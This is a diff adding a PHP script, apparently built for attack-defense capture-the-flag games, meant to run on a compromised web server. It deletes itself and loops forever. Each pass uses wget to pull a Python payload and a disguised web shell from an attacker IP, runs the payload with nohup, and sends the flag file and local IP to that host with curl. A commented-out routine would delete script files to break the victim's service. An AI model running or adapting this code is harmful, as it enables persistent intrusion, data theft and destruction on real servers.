@@ -1,0 +1,106 @@
+<?php
+unlink($_SERVER['SCRIPT_FILENAME']); 
+ignore_user_abort(true); 
+set_time_limit(0); 
+$ip =  "172.20.120.5"; //edit my server's ip
+$pos = "/tmp/systemd-private-a29c8d4b5e76422cb78179dd14906715-systemd-timesyncd.service-p9PBKc/session/"; 
+$cmd1 = "mkdir -p $pos;wget http://$ip/py.txt -O $pos/mylab.py"; 
+$cmd2 = "nohup python $pos/mylab.py > /dev/null &"; 
+$basedir="/var/www/html/"; //Edit the path
+$cmd3="wget http://$ip/user-inc.txt -O $basedir/--user.inc.php";
+$flagname = '/flag'; //Edit the flag path
+
+$time = time();
+function get_allfiles($path,&$files) {
+    if(is_dir($path)){
+        $dp = dir($path);
+        while ($file = $dp ->read()){
+            if($file !="." && $file !=".."){
+                get_allfiles($path."/".$file, $files);
+            }
+        }
+        $dp ->close();
+    }
+    if(is_file($path)){
+        $files[] =  $path;
+    }
+}
+
+function get_filenamesbydir($dir){
+    $files =  array();
+    get_allfiles($dir,$files);
+    return $files;
+}
+
+class dir
+{  
+	function anti_av($path)
+	{  
+		if(!file_exists($path))
+		{  
+			return false;  
+		}  
+		$list=scandir($path);  
+		foreach($list as $f)
+		{  
+			if($f!='.'&&$f!='..')
+			{  
+				if(is_dir($path."/".$f))
+				{  
+					$this->anti_av($path."/".$f);  
+				}
+				else
+				{  
+					if(substr(strrchr($f, '.'), 1)=="php"||substr(strrchr($f, '.'), 1)=="sh"||substr(strrchr($f, '.'), 1)=="py"||substr(strrchr($f, '.'), 1)=="pl")
+					{
+						if($f != 'mylab.py')
+						{
+							system("rm -rf ".$path."/".$f);
+						}
+					}
+				}  
+			}
+		}
+	}  
+}  
+
+while(1)
+{
+	$cmd = "ps axu|grep 'mylab.py'|grep -v 'grep'|wc -l";
+	$ret = shell_exec("$cmd");
+	$ret = rtrim($ret, "rn");
+	if($ret==0)
+	{
+		system($cmd1);//download py
+		system($cmd2);//run py
+		system($cmd3);//down shell
+	};
+	$tm = time();
+	$write = "echo $tm > /tmp/session_time";  
+	system($write);
+	//获取flag 并回传 = 
+	$flag = file_get_contents($flagname);
+	$cmdx="ifconfig eth0 | grep inet | sed '2d'| awk '{ print \$2}'|awk -F: '{ print \$2 }'";//edit netcard's name eth0 or others
+	$localip = shell_exec($cmdx); 
+	sleep(1);
+	$flag ="$localip:::$flag"; //$localip=$_SERVER['SERVER_ADDR']
+	$cmd4 = "curl -d flag=".urlencode($flag)."  http://$ip/get.php"; 
+	system($cmd4);
+	sleep(30);
+	/*$file = get_filenamesbydir($basedir);
+	$a=new dir(); 
+	$a->anti_av("/tmp");  
+	foreach($file as $f)
+	{
+		$t = filemtime($f);
+	    $filename = substr(strrchr($f,"/"),1);
+	    if( $t > $time )
+		{
+			if($filename != '--user.inc.php' && $filename != '.session.php')
+			{
+				system("rm -f ".$f);
+			}
+		}
+	}*/ //破环对端机器的服务
+}
+?>
